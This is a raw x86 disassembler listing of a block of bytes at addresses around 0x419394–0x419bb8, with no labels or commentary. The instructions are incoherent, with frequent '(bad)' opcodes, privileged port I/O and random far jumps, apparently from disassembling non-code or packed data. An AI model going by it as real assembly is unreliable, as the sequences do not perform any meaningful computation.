  419394:	ror    dh,cl
  419396:	cwde   
  419397:	sbb    edx,DWORD PTR [edx+edi*8-0x18]
  41939b:	jnp    0x4193f2
  41939d:	lds    ebx,FWORD PTR [edi+edx*4+0x77]
  4193a1:	mov    al,0xf5
  4193a3:	ja     0x4193eb
  4193a5:	nop
  4193a6:	xchg   esp,eax
  4193a7:	cmc    
  4193a8:	pop    eax
  4193a9:	or     al,0xc5
  4193ab:	popf   
  4193ac:	sahf   
  4193ad:	cli    
  4193ae:	mov    cl,BYTE PTR [esi+0x54]
  4193b1:	es pop esi
  4193b3:	mov    eax,0xbe46543f
  4193b8:	out    dx,al
  4193b9:	cmp    ch,BYTE PTR [edx+0x4f9a334a]
  4193bf:	aad    0xed
  4193c1:	test   al,0xf0
  4193c3:	jns    0x419382
  4193c5:	adc    ebp,DWORD PTR [ebp+edx*1+0x6c]
  4193c9:	dec    edi
  4193ca:	sbb    esi,ecx
  4193cc:	xor    al,0x6b
  4193ce:	bound  ebp,QWORD PTR [ebx+0x46054eee]
  4193d4:	mov    ecx,0x601da8d2
  4193d9:	xchg   edi,eax
  4193da:	or     eax,0x890554fa
  4193df:	xchg   BYTE PTR [ecx-0x57],ah
  4193e2:	pop    ecx
  4193e3:	mov    eax,ds:0xdefabb58
  4193e8:	jnp    0x4193a6
  4193ea:	push   esp
  4193eb:	push   bp
  4193ed:	fcmovnb st,st(7)
  4193ef:	in     eax,0x78
  4193f1:	neg    DWORD PTR [ecx+0x57]
  4193f4:	and    BYTE PTR [ebx+edi*4+0x0],0x8a
  4193f9:	push   cs
  4193fa:	jecxz  0x419401
  4193fc:	jmp    0x419385
  4193fe:	cmp    al,0xc6
  419400:	xchg   BYTE PTR [esi-0x2d3f124a],bl
  419406:	int3   
  419407:	push   eax
  419408:	jg     0x4193f8
  41940a:	fldcw  WORD PTR [eax]
  41940c:	sbb    al,0x1e
  41940e:	push   ecx
  41940f:	sub    al,0x0
  419411:	mov    bl,0xa4
  419413:	pop    edi
  419414:	sti    
  419415:	xchg   esp,eax
  419416:	mov    eax,ds:0x728c3a2b
  41941b:	(bad)  
  41941c:	call   0x495b75bb
  419421:	fwait
  419422:	inc    esp
  419423:	out    0xf5,eax
  419425:	jge    0x41947c
  419427:	xchg   edi,eax
  419428:	mov    bh,ch
  41942a:	fisubr DWORD PTR [edx+0x1a]
  41942d:	ss dec edx
  41942f:	push   esi
  419430:	and    DWORD PTR [esi-0x65],ecx
  419433:	jp     0x4193da
  419435:	dec    esp
  419436:	and    ebx,edx
  419438:	pop    ss
  419439:	xchg   DWORD PTR ds:0x8c0a2a72,esp
  41943f:	fld    DWORD PTR [edi-0x1fcbca1e]
  419445:	ss jbe 0x419425
  419448:	jle    0x419444
  41944a:	jnp    0x4193d3
  41944c:	and    bh,BYTE PTR [edi]
  41944e:	inc    edx
  41944f:	pop    esi
  419450:	(bad)  
  419451:	fld    TBYTE PTR [ebx-0xe]
  419454:	xor    ecx,DWORD PTR [eax-0x1c]
  419457:	sti    
  419458:	sub    ebx,DWORD PTR [ebp+0xda9b824]
  41945e:	call   0x429:0x53e65116
  419465:	fidivr DWORD PTR [edx+0x7c6bfb82]
  41946b:	(bad)  
  41946d:	mov    edx,0xbbe346e0
  419472:	push   0xc4ccf988
  419477:	mov    cl,0x3c
  419479:	pop    ss
  41947a:	xor    ch,BYTE PTR ds:0x66e1ce37
  419480:	inc    ecx
  419481:	push   ecx
  419482:	stc    
  419483:	aam    0x5d
  419485:	inc    edx
  419486:	push   ecx
  419487:	scas   al,BYTE PTR es:[edi]
  419488:	(bad)  
  419489:	in     al,0xf6
  41948b:	jge    0x419476
  41948d:	nop
  41948e:	mov    ah,0x27
  419490:	push   edi
  419491:	scas   al,BYTE PTR es:[edi]
  419492:	adc    al,0x7a
  419494:	addr16 push ebp
  419496:	in     al,0x0
	...
  419514:	sbb    al,0x6c
  419516:	ins    DWORD PTR es:[edi],dx
  419517:	les    edi,FWORD PTR [ebp-0x3b]
  41951a:	mov    ebp,0x7e8bcdfc
  41951f:	jae    0x419568
  419521:	or     al,0xf0
  419523:	jae    0x419502
  419525:	xor    eax,0x76b0001
  41952a:	add    BYTE PTR [eax],al
  41952c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41952d:	mov    BYTE PTR [eax+edx*2+0x472f233f],ah
  419534:	(bad)  
  419535:	xor    edi,edi
  419537:	int3   
  419538:	pushf  
  419539:	(bad)  [edi+0x4]
  41953c:	adc    eax,DWORD PTR [ebp-0x28]
  41953f:	mov    bh,0x25
  419541:	sahf   
  419542:	bound  ebp,QWORD PTR [esi]
  419544:	xchg   BYTE PTR [esi-0x5],al
  419547:	jb     0x4194e0
  419549:	mov    ds:0x64cccc50,eax
  41954e:	outs   dx,BYTE PTR ds:[esi]
  41954f:	ret    0x1720
  419552:	ins    BYTE PTR es:[edi],dx
  419553:	inc    eax
  419554:	sub    BYTE PTR [esp+ecx*1],0xae
  419558:	sbb    DWORD PTR [ebp+0x21],ecx
  41955b:	stos   BYTE PTR es:[edi],al
  41955c:	cdq    
  41955d:	fucomp st(6)
  41955f:	mov    ebp,0xdc50dc78
  419564:	pushf  
  419565:	or     DWORD PTR [edx-0x22543bad],edi
  41956b:	dec    esp
  41956c:	pop    edi
  41956d:	rcl    dh,1
  41956f:	inc    eax
  419570:	pop    ecx
  419571:	js     0x4195e5
  419573:	push   ebx
  419574:	pop    edi
  419575:	(bad)  
  419576:	jno    0x419546
  419578:	xchg   BYTE PTR [edx],dl
  41957a:	mov    bl,0x24
  41957c:	adc    cl,BYTE PTR [edx]
  41957e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41957f:	pushf  
  419580:	mov    BYTE PTR [ebp-0x22],bh
  419583:	adc    eax,0xc7426137
  419588:	mov    edi,DWORD PTR [ebx+0xc42720d]
  41958e:	rcl    BYTE PTR [ebx+0x4a59dc6],0x6c
  419595:	or     ch,BYTE PTR [eax]
  419597:	and    ch,dh
  419599:	cmp    dl,BYTE PTR [eax]
  41959b:	add    dh,dh
  41959d:	pop    ebp
  41959e:	add    DWORD PTR [ebp+0x6b],eax
  4195a1:	add    eax,0xc28641a8
  4195a6:	inc    ebx
  4195a7:	sbb    DWORD PTR [edx-0xf],0xca0724a4
  4195ae:	(bad)  
  4195af:	arpl   WORD PTR [ebx+edi*8-0x7aa106a0],di
  4195b6:	push   esi
  4195b7:	add    BYTE PTR [esi+ebp*2],bl
  4195ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4195bb:	jne    0x419584
  4195bd:	nop
  4195be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4195bf:	cdq    
  4195c0:	pusha  
  4195c1:	(bad)  
  4195c2:	adc    eax,0xded84f61
  4195c7:	mov    ch,0x29
  4195c9:	ds pusha 
  4195cb:	rol    DWORD PTR [eax+0x799a5f66],cl
  4195d1:	inc    DWORD PTR [eax+0x64]
  4195d4:	mov    BYTE PTR [eax],dh
  4195d6:	jnp    0x419595
  4195d8:	pusha  
  4195d9:	sub    al,0xa7
  4195db:	ficomp WORD PTR [edi]
  4195dd:	(bad)
  4195e0:	push   ebp
  4195e1:	push   eax
  4195e2:	mov    ds:0x97bcb61c,eax
  4195e7:	cli    
  4195e8:	add    ebp,DWORD PTR [eax+0x25a7f97d]
  4195ee:	sbb    BYTE PTR [eax-0x59944456],ch
  4195f4:	mov    al,ds:0xfa736b1a
  4195f9:	or     eax,0xcf8351e9
  4195fe:	in     eax,dx
  4195ff:	sub    eax,0x6a80522f
  419604:	mov    esi,0x5498a080
  419609:	and    DWORD PTR [ebx+0x7d],esp
  41960c:	push   cs
  41960d:	sbb    al,0x1c
  41960f:	and    eax,0x1f63b1d2
  419614:	mov    esp,0x63b309bb
  419619:	jp     0x419686
  41961b:	mov    ch,0x36
  41961d:	inc    ebp
  41961e:	aam    0xd1
  419620:	cmp    BYTE PTR [ecx],al
  419622:	or     al,0xeb
  419624:	loopne 0x41968c
  419626:	cmp    cl,BYTE PTR [ebp+0x25]
  419629:	loope  0x4195ab
  41962b:	ret    
  41962c:	fbstp  TBYTE PTR [eax]
  41962e:	movq   mm5,QWORD PTR [ebx]
  419631:	jns    0x419600
  419633:	xchg   esp,eax
  419634:	pop    ebx
  419635:	and    al,0x7
  419637:	iret   
  419638:	arpl   WORD PTR [ecx-0x4b],dx
  41963b:	ret    0x7ce3
  41963e:	scas   eax,DWORD PTR es:[edi]
  41963f:	mov    bh,0x71
  419641:	lods   al,BYTE PTR ds:[esi]
  419642:	cmc    
  419643:	aad    0xf2
  419645:	push   0xfffffff9
  419647:	and    bh,al
  419649:	and    BYTE PTR [ecx-0x1e376c67],bh
  41964f:	lea    edi,[edi+0x32e7b516]
  419655:	pop    esi
  419656:	mov    ebp,0x3e6e6c4f
  41965b:	loope  0x41962b
  41965d:	cmc    
  41965e:	out    0xd7,al
  419660:	push   edx
  419661:	push   esi
  419662:	ss out 0x9a,eax
  419665:	inc    ecx
  419666:	mov    eax,0xc05361af
  41966b:	push   ebp
  41966c:	lods   al,BYTE PTR ds:[esi]
  41966d:	add    eax,0x49621e41
  419672:	lds    ecx,FWORD PTR [eax+0x2de269ff]
  419678:	lods   eax,DWORD PTR ds:[esi]
  419679:	cmp    BYTE PTR [edx-0x9],dl
  41967c:	sub    cl,BYTE PTR [edx+0x43]
  41967f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419680:	iret   
  419681:	mov    ebx,0xf0465d5c
  419686:	fidivr WORD PTR [edi+0x791cbca5]
  41968c:	mov    esi,0xc2c3e06d
  419691:	cmp    bh,al
  419693:	and    BYTE PTR ds:[ecx-0x40],ch
  419697:	out    dx,al
  419698:	jmp    0x17a0a662
  41969d:	iret   
  41969e:	rcl    BYTE PTR [edx],cl
  4196a0:	shl    BYTE PTR [edi+0x78],0x37
  4196a4:	iret   
  4196a5:	scas   al,BYTE PTR es:[edi]
  4196a6:	sub    eax,0x668121d7
  4196ab:	sbb    DWORD PTR [ebp-0x7c],esp
  4196ae:	push   ds
  4196af:	lods   eax,DWORD PTR ds:[esi]
  4196b0:	push   ebp
  4196b1:	xchg   edx,eax
  4196b2:	pop    ebp
  4196b3:	repnz inc esi
  4196b5:	stos   BYTE PTR es:[edi],al
  4196b6:	pushw  cs
  4196b8:	sbb    BYTE PTR [si-0x2def],ah
  4196bd:	sbb    edi,edi
  4196bf:	add    ebx,DWORD PTR [edx+0x5293d323]
  4196c5:	pop    esi
  4196c6:	std    
  4196c7:	test   DWORD PTR [edx+0x5e123ff6],esi
  4196cd:	mov    al,ds:0x4aceaebd
  4196d2:	mov    DWORD PTR [ecx-0x102c4218],ebx
  4196d8:	xchg   esi,eax
  4196d9:	pop    esi
  4196da:	xchg   esi,eax
  4196db:	jecxz  0x4196de
  4196dd:	push   ebx
  4196de:	dec    ebp
  4196df:	pop    es
  4196e0:	gs xor bh,ah
  4196e3:	sahf   
  4196e4:	popf   
  4196e5:	or     esi,DWORD PTR [edi+0x4d2d69a8]
  4196eb:	inc    edx
  4196ec:	pop    ebx
  4196ed:	(bad)  
  4196ee:	imul   edx,DWORD PTR [edi-0x3383c8b1],0x46ba8ebb
  4196f8:	pop    es
  4196f9:	mov    bp,0xa4c2
  4196fd:	and    edi,edi
  4196ff:	fidiv  WORD PTR [ecx]
  419701:	xchg   ebp,eax
  419702:	popf   
  419703:	mov    ebx,0xed412e5f
  419709:	cmp    eax,0x11157605
  41970e:	clc    
  41970f:	inc    ebx
  419710:	jmp    0x3311911
  419715:	jns    0x419777
  419717:	pop    es
  419718:	xchg   esp,eax
  419719:	cmp    al,0x59
  41971b:	jnp    0x419784
  41971d:	inc    ebp
  41971e:	bound  eax,QWORD PTR ds:0xd78e73c7
  419724:	adc    DWORD PTR [edi],ecx
  419726:	push   ebx
  419727:	stos   DWORD PTR es:[edi],eax
  419728:	lods   al,BYTE PTR ds:[esi]
  419729:	jnp    0x419765
  41972b:	xor    esi,ebp
  41972d:	mov    DWORD PTR [edi-0x12e4b4f5],ebx
  419733:	mov    al,0x9d
  419735:	stc    
  419736:	push   ss
  419737:	pop    esi
  419738:	xor    DWORD PTR [edx-0x19],0xd60d2ca7
  41973f:	xchg   ecx,eax
  419740:	pop    edi
  419741:	adc    ch,cl
  419743:	inc    ebx
  419744:	test   eax,0x8a669ea1
  419749:	in     eax,0x43
  41974b:	inc    esp
  41974c:	loop   0x419714
  41974e:	cmp    BYTE PTR ds:0xa32bb137,dl
  419754:	sub    BYTE PTR [ecx],dh
  419756:	or     eax,ebp
  419758:	in     al,dx
  419759:	rcr    BYTE PTR [eax],0xd6
  41975c:	clc    
  41975d:	enter  0x97cc,0x5
  419761:	jge    0x41972f
  419763:	(bad)
  419767:	lods   eax,DWORD PTR ds:[esi]
  419768:	int    0x7e
  41976a:	sar    BYTE PTR [edx-0x493187f1],cl
  419770:	jmp    0x4eda:0x5e8ceec7
  419777:	xchg   ebx,eax
  419778:	inc    esp
  419779:	cld    
  41977a:	mov    ss,WORD PTR [ecx]
  41977c:	jp     0x419767
  41977e:	inc    edi
  41977f:	out    0x5,al
  419781:	cmp    al,0x12
  419783:	inc    edi
  419784:	loop   0x4197b0
  419786:	fdiv   DWORD PTR [esi+0x24]
  419789:	mov    edx,DWORD PTR [eax-0x3407099]
  41978f:	gs test ch,dl
  419792:	in     al,0x74
  419794:	hlt    
  419795:	xchg   DWORD PTR [edx-0x5d5de39b],ebx
  41979b:	test   BYTE PTR [edi+0x72],ch
  41979e:	repnz mov BYTE PTR [ebp+0x46],ah
  4197a2:	test   DWORD PTR [edx],eax
  4197a4:	push   ebx
  4197a5:	pop    sp
  4197a7:	add    BYTE PTR [ebx],bh
  4197a9:	fldenv [ecx-0x226699a6]
  4197af:	bound  edx,QWORD PTR [edx-0x31103c96]
  4197b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4197b6:	inc    edx
  4197b7:	push   0xffffffce
  4197b9:	jg     0x419829
  4197bb:	fdiv   DWORD PTR [edx]
  4197bd:	out    0x4b,eax
  4197bf:	or     al,0x2d
  4197c1:	out    dx,eax
  4197c2:	out    dx,al
  4197c3:	pushf  
  4197c4:	xor    ebp,edx
  4197c6:	nop
  4197c7:	mov    al,0x46
  4197c9:	into   
  4197ca:	in     eax,0x8b
  4197cc:	sbb    bl,bl
  4197ce:	mov    al,0xd9
  4197d0:	retf   
  4197d1:	xchg   BYTE PTR [esi+0xd91530c],ch
  4197d7:	or     BYTE PTR [esi],0x66
  4197da:	push   ecx
  4197db:	adc    DWORD PTR [ebx-0x431bc03a],esp
  4197e1:	push   eax
  4197e2:	arpl   cx,dx
  4197e4:	adc    DWORD PTR ds:[ecx-0x74],ebx
  4197e8:	pop    es
  4197e9:	sbb    al,0x59
  4197eb:	push   0x41aad71e
  4197f0:	repz mov ecx,0x7f98543
  4197f6:	xchg   DWORD PTR [edi+0x2a],edi
  4197f9:	pop    esp
  4197fa:	mov    bl,0xd7
  4197fc:	or     eax,0x25733337
  419801:	push   ebp
  419802:	jmp    0x419813
  419804:	outs   dx,DWORD PTR ds:[esi]
  419805:	loopne 0x4197fc
  419807:	sub    esi,DWORD PTR [edi]
  419809:	into   
  41980a:	add    eax,0x83e5941b
  41980f:	push   edi
  419810:	mov    DWORD PTR [eax],0x5fb8104a
  419816:	rcl    DWORD PTR [eax+0x25],1
  419819:	(bad)  
  41981a:	xor    al,0x3
  41981c:	xchg   ebp,eax
  41981d:	stos   DWORD PTR es:[edi],eax
  41981e:	ret    
  41981f:	int3   
  419820:	push   ebp
  419821:	push   ds
  419822:	sbb    dl,al
  419824:	retf   0x335e
  419827:	and    BYTE PTR [ebp+0x120a4e7f],0x7a
  41982e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41982f:	outs   dx,BYTE PTR ds:[esi]
  419830:	repnz xchg edx,eax
  419832:	outs   dx,DWORD PTR ds:[esi]
  419833:	bound  esp,QWORD PTR [ecx]
  419835:	retf   
  419836:	neg    DWORD PTR [edx-0x6d]
  419839:	xor    DWORD PTR [esi],edi
  41983b:	fs into 
  41983d:	cld    
  41983e:	push   eax
  41983f:	xchg   BYTE PTR [ebx+0x2893d4b2],bh
  419845:	push   ss
  419846:	xor    al,BYTE PTR [eax-0x1157b8b5]
  41984c:	mov    ebp,0xeb49c333
  419851:	xchg   ebx,eax
  419852:	pop    esp
  419853:	cmc    
  419854:	sti    
  419855:	retf   
  419856:	rcl    BYTE PTR ds:0xdc0ca11,1
  41985c:	rol    DWORD PTR [edx],1
  41985e:	sbb    al,0x98
  419860:	pop    ecx
  419861:	aad    0xc3
  419863:	xchg   ebp,eax
  419864:	ja     0x419828
  419866:	out    0xa4,eax
  419868:	das    
  419869:	shl    DWORD PTR [esi-0x3e],1
  41986c:	push   eax
  41986d:	dec    ecx
  41986e:	aas    
  41986f:	mov    bh,0x6f
  419871:	push   esi
  419872:	sbb    cl,dh
  419874:	adc    BYTE PTR [ebp+edi*4+0x240348a0],dl
  41987b:	stc    
  41987c:	fs cdq 
  41987e:	and    cl,BYTE PTR [ecx+0x4c]
  419881:	(bad)  
  419882:	outs   dx,DWORD PTR ds:[esi]
  419883:	shr    dl,cl
  419885:	mov    al,ds:0xd083b863
  41988a:	adc    cl,BYTE PTR [ebx+0x40]
  41988d:	repnz lahf 
  41988f:	push   ebx
  419890:	and    eax,DWORD PTR [edx+0x398e2462]
  419896:	fld    DWORD PTR [ecx]
  419898:	jge    0x419821
  41989a:	int3   
  41989b:	pop    ebx
  41989c:	mov    ecx,0x813cff9
  4198a1:	stos   DWORD PTR es:[edi],eax
  4198a2:	xchg   esp,eax
  4198a3:	mov    ch,BYTE PTR [ebx]
  4198a5:	sbb    dl,BYTE PTR [ecx-0x3079d83c]
  4198ab:	xor    al,0x26
  4198ad:	imul   esp,DWORD PTR ds:0x37396f60,0x354c7c02
  4198b7:	loop   0x419871
  4198b9:	aaa    
  4198ba:	stos   BYTE PTR es:[edi],al
  4198bb:	mov    bh,0x22
  4198bd:	sub    al,0xc1
  4198bf:	and    BYTE PTR [eax+0x473842ba],bh
  4198c5:	jne    0x4198b4
  4198c7:	push   cs
  4198c8:	jl     0x419937
  4198ca:	daa    
  4198cb:	fild   DWORD PTR [esi+0x33]
  4198ce:	and    eax,0x89f8b71a
  4198d3:	mov    dh,0x2c
  4198d5:	lock dec ecx
  4198d7:	inc    eax
  4198d8:	add    eax,0xdf8862f6
  4198dd:	das    
  4198de:	jae    0x419938
  4198e0:	fdivr  QWORD PTR [edx-0x29]
  4198e3:	mov    ecx,0xb29532d8
  4198e8:	fld    QWORD PTR [ebx+edi*4+0x43e171a6]
  4198ef:	dec    edi
  4198f0:	add    bl,BYTE PTR [ebp+0x4d]
  4198f3:	stos   DWORD PTR es:[edi],eax
  4198f4:	popf   
  4198f5:	or     edi,DWORD PTR [edx-0x3f]
  4198f8:	imul   eax,DWORD PTR ds:0x4842407,0xffffffd7
  4198ff:	push   esi
  419900:	out    0xe6,eax
  419902:	mul    BYTE PTR [esi+ebx*8-0x64a7a87d]
  419909:	xchg   edx,eax
  41990a:	(bad)  
  41990c:	div    DWORD PTR [edi-0x88c30a0]
  419912:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419913:	cwde   
  419914:	ss inc ebp
  419916:	add    DWORD PTR [ebp-0x3150bbfe],esi
  41991c:	sub    al,0x3b
  41991e:	mov    es,WORD PTR cs:[ebp+0x3b]
  419922:	fcmovnbe st,st(2)
  419924:	cmc    
  419925:	adc    BYTE PTR [ebp+0x2d],bh
  419928:	xor    DWORD PTR [eax-0x6f9a6e24],esi
  41992e:	call   0xc0fd:0x70ab2afa
  419935:	sahf   
  419936:	clc    
  419937:	push   edi
  419938:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419939:	or     BYTE PTR [ecx+eax*8-0x36],cl
  41993d:	fst    DWORD PTR [ecx+0x5ae9c2b7]
  419943:	push   esi
  419944:	xchg   edi,eax
  419945:	xchg   ebx,eax
  419946:	jb     0x4198f7
  419948:	push   0x1d
  41994a:	jge    0x419930
  41994c:	and    eax,0xe1c86926
  419951:	or     ebx,DWORD PTR [ebx]
  419953:	and    DWORD PTR [ecx-0x7104da17],ebx
  419959:	fwait
  41995a:	cmp    eax,0x83cd16c2
  41995f:	arpl   WORD PTR [eax],bp
  419961:	or     BYTE PTR [ecx+esi*4-0x54],bl
  419965:	pop    es
  419966:	int    0xd1
  419968:	pop    ebp
  419969:	mov    bl,0x1d
  41996b:	stos   BYTE PTR es:[edi],al
  41996c:	or     bl,0x88
  41996f:	jp     0x4198fa
  419971:	or     al,0x48
  419973:	xor    DWORD PTR [eax+eiz*2-0x1bd5573d],esi
  41997a:	mov    edx,0xbca2104e
  41997f:	in     al,0x5e
  419981:	push   ds
  419982:	test   al,0x25
  419984:	in     eax,dx
  419985:	add    DWORD PTR [ebp-0x588315bd],0x77
  41998c:	push   ebp
  41998d:	jecxz  0x419980
  41998f:	and    dh,BYTE PTR [ebx-0x79dfbb22]
  419995:	adc    eax,0xe12e1948
  41999a:	in     al,dx
  41999b:	cld    
  41999c:	pop    esp
  41999d:	outs   dx,DWORD PTR ds:[esi]
  41999e:	leave  
  41999f:	test   al,0x74
  4199a1:	jmp    0x4199e4
  4199a3:	imul   eax,DWORD PTR ds:0xba9422bb,0x8dbf465a
  4199ad:	add    DWORD PTR [ebx],esi
  4199af:	push   0x5f
  4199b1:	xchg   edi,eax
  4199b2:	xor    al,BYTE PTR [esi]
  4199b4:	push   ds
  4199b5:	pop    ds
  4199b6:	and    eax,0x3edeed4f
  4199bb:	ss push ebx
  4199bd:	inc    eax
  4199be:	mov    edx,0x82926348
  4199c3:	jecxz  0x4199f0
  4199c5:	jp     0x4199b5
  4199c7:	jno    0x419971
  4199c9:	pop    eax
  4199ca:	xchg   ebp,eax
  4199cb:	sar    DWORD PTR [ecx-0x1],0xa
  4199cf:	xchg   ebp,eax
  4199d0:	jp     0x419a03
  4199d2:	sbb    BYTE PTR ds:0x8bb815f5,ch
  4199d8:	dec    ebp
  4199d9:	and    esp,eax
  4199db:	lods   eax,DWORD PTR ds:[esi]
  4199dc:	stc    
  4199dd:	inc    edx
  4199de:	cwde   
  4199df:	xor    al,0xc9
  4199e1:	lock imul esp,DWORD PTR [ebx],0x66
  4199e5:	sbb    al,0xd9
  4199e7:	sub    edx,DWORD PTR [eax]
  4199e9:	lahf   
  4199ea:	das    
  4199eb:	xchg   esp,eax
  4199ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4199ed:	scas   al,BYTE PTR es:[edi]
  4199ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4199ef:	mov    DWORD PTR [ebp-0x48],edx
  4199f2:	adc    DWORD PTR [edx],esi
  4199f4:	mov    ds:0x47530a7f,al
  4199f9:	xor    cl,bh
  4199fb:	and    ch,BYTE PTR [ebp-0x26]
  4199fe:	inc    ebx
  4199ff:	mov    eax,ds:0xdba9a03a
  419a04:	xchg   BYTE PTR [edx],ah
  419a06:	out    0x9d,eax
  419a08:	xor    DWORD PTR [esi+0x50647ad3],0x7417bdfe
  419a12:	cmc    
  419a13:	leave  
  419a14:	inc    edx
  419a15:	(bad)  
  419a16:	cld    
  419a17:	(bad)  
  419a18:	(bad)  
  419a19:	push   esp
  419a1a:	mov    ds:0x8a728c58,eax
  419a1f:	sti    
  419a20:	ss out dx,eax
  419a22:	mov    ?,WORD PTR [edi-0x4b]
  419a25:	test   DWORD PTR [eax+0xa08cdae],ecx
  419a2b:	jp     0x419aa0
  419a2d:	jb     0x419a89
  419a2f:	jns    0x4199d0
  419a31:	test   DWORD PTR [ebp-0x3a37d50],ebx
  419a37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419a38:	popf   
  419a39:	push   es
  419a3a:	cld    
  419a3b:	mov    WORD PTR [edx+ecx*8-0xc2a94ab],fs
  419a42:	sub    BYTE PTR [edi-0x255ad806],0x66
  419a49:	lods   al,BYTE PTR ds:[esi]
  419a4a:	enterw 0x751c,0xd6
  419a4f:	retf   0x477b
  419a52:	stos   DWORD PTR es:[edi],eax
  419a53:	xchg   ebp,eax
  419a54:	lods   al,BYTE PTR ds:[esi]
  419a55:	push   eax
  419a56:	inc    ebp
  419a57:	jne    0x419a22
  419a59:	push   edi
  419a5a:	inc    edi
  419a5b:	(bad)  [eax+edx*4]
  419a5e:	dec    ebp
  419a5f:	popf   
  419a60:	faddp  st(3),st
  419a62:	(bad)  
  419a63:	dec    eax
  419a64:	(bad)  
  419a65:	xchg   edi,eax
  419a66:	inc    esi
  419a67:	sbb    BYTE PTR [esi+0x5cefc42d],bl
  419a6d:	paddd  mm3,QWORD PTR [ebx+0x75b493f3]
  419a74:	dec    ecx
  419a75:	mov    bh,0x5b
  419a77:	mov    WORD PTR ds:0x5a94e0b9,?
  419a7d:	cdq    
  419a7e:	fwait
  419a7f:	aas    
  419a80:	sti    
  419a81:	rcr    BYTE PTR [eax-0xa],1
  419a84:	xor    eax,0xb0b0ab86
  419a89:	sub    ebp,DWORD PTR [edi]
  419a8b:	mov    al,ds:0x38c51add
  419a90:	pop    edi
  419a91:	mov    dl,0xa8
  419a93:	push   edi
  419a94:	and    esi,0x7d
  419a97:	pop    ebx
  419a98:	inc    edi
  419a99:	(bad)  
  419a9a:	iret   
  419a9b:	or     BYTE PTR [edx],0xce
  419a9e:	inc    ebx
  419a9f:	arpl   WORD PTR [esi],si
  419aa1:	imul   ebx,DWORD PTR [edx-0x601b685d],0xf5814e13
  419aab:	hlt    
  419aac:	xor    ebp,DWORD PTR [esi+edx*2]
  419aaf:	dec    ebp
  419ab0:	loope  0x419a4a
  419ab2:	push   cs
  419ab3:	(bad)
  419ab6:	fsub   st,st(2)
  419ab8:	push   esi
  419ab9:	scas   al,BYTE PTR es:[edi]
  419aba:	leave  
  419abb:	mov    ebp,0xc137eb15
  419ac0:	jg     0x419ac1
  419ac2:	int    0x6c
  419ac4:	or     DWORD PTR [ebp-0x26],ebx
  419ac7:	ficom  WORD PTR [ebx+0x35]
  419aca:	push   esi
  419acb:	(bad)  
  419acc:	xchg   edi,eax
  419acd:	xor    esp,esi
  419acf:	in     al,dx
  419ad0:	outs   dx,DWORD PTR ds:[esi]
  419ad1:	iret   
  419ad2:	fistp  DWORD PTR [edi-0x24]
  419ad5:	in     al,0xb0
  419ad7:	dec    ebx
  419ad8:	sbb    DWORD PTR [esi-0x47],eax
  419adb:	popf   
  419adc:	and    al,0x6e
  419ade:	xor    bh,bl
  419ae0:	iret   
  419ae1:	icebp  
  419ae2:	xchg   ebp,eax
  419ae3:	daa    
  419ae4:	leave  
  419ae5:	push   ebx
  419ae6:	rol    DWORD PTR [ebx-0x5642e354],cl
  419aec:	dec    ebp
  419aed:	push   0xffffffcd
  419aef:	sub    eax,0xc22a2b7b
  419af4:	inc    edx
  419af5:	jle    0x419b36
  419af7:	std    
  419af8:	mov    eax,0x80594ef6
  419afd:	cmp    eax,0x45e4f67a
  419b02:	push   esi
  419b03:	jnp    0x419b0d
  419b05:	popa   
  419b06:	out    dx,al
  419b07:	stc    
  419b08:	fwait
  419b09:	add    eax,0xfeaf78a5
  419b0e:	cmp    edi,DWORD PTR [ebp+0x63]
  419b11:	mov    cl,dl
  419b13:	repnz scas eax,DWORD PTR es:[edi]
  419b15:	mov    ds:0x3b3ac8a,al
  419b1a:	fs mov ecx,0x1119feec
  419b20:	shr    DWORD PTR [eax+edi*4+0x1a6ec2b3],cl
  419b27:	addr16 in al,dx
  419b29:	(bad)  
  419b2b:	idiv   BYTE PTR [ebp-0x7b812dbd]
  419b31:	cmp    DWORD PTR [edi+0x11],eax
  419b34:	push   ebp
  419b35:	xor    eax,0xdc0013d5
  419b3a:	sub    dh,ah
  419b3c:	push   ebx
  419b3d:	xlat   BYTE PTR ds:[ebx]
  419b3e:	xor    eax,0x666ed655
  419b43:	icebp  
  419b44:	in     eax,0x50
  419b46:	pop    es
  419b47:	mov    eax,ds:0x89713521
  419b4c:	pop    esi
  419b4d:	repz add ch,0xd4
  419b51:	clc    
  419b52:	ret    
  419b53:	inc    esp
  419b54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419b55:	lods   eax,DWORD PTR ds:[esi]
  419b56:	xchg   edi,eax
  419b57:	sbb    bl,BYTE PTR [esi+0x11e2e9cc]
  419b5d:	call   0x70204ff8
  419b62:	shl    BYTE PTR [eax],1
  419b64:	push   0x357b2aef
  419b69:	add    eax,0x5512580e
  419b6e:	sub    al,0x7b
  419b70:	aad    0xac
  419b72:	out    dx,eax
  419b73:	cwde   
  419b74:	imul   eax,DWORD PTR [eax-0x78],0xffffff9f
  419b78:	mul    BYTE PTR ds:0x82a51db
  419b7e:	ret    
  419b7f:	imul   esp,DWORD PTR [ebp+0x7fb76bf2],0xffffff9c
  419b86:	xor    al,0x57
  419b88:	jmp    0xba6a:0xfd38f29a
  419b8f:	mov    ah,0xad
  419b91:	idiv   BYTE PTR [edi]
  419b93:	dec    esi
  419b94:	push   fs
  419b96:	ins    BYTE PTR es:[edi],dx
  419b97:	mov    ebp,0xd462685a
  419b9c:	ficom  DWORD PTR [ebp-0x127a03ff]
  419ba2:	cli    
  419ba3:	mov    ds,WORD PTR [eax]
  419ba5:	ret    0xc344
  419ba8:	xchg   esp,eax
  419ba9:	ins    DWORD PTR es:[edi],dx
  419baa:	sub    esi,DWORD PTR [edi]
  419bac:	jge    0x419c0c
  419bae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419baf:	lahf   
  419bb0:	sub    esp,DWORD PTR [ebx-0x1d5b3dc9]
  419bb6:	jae    0x419b68
  419bb8:	pop    ds
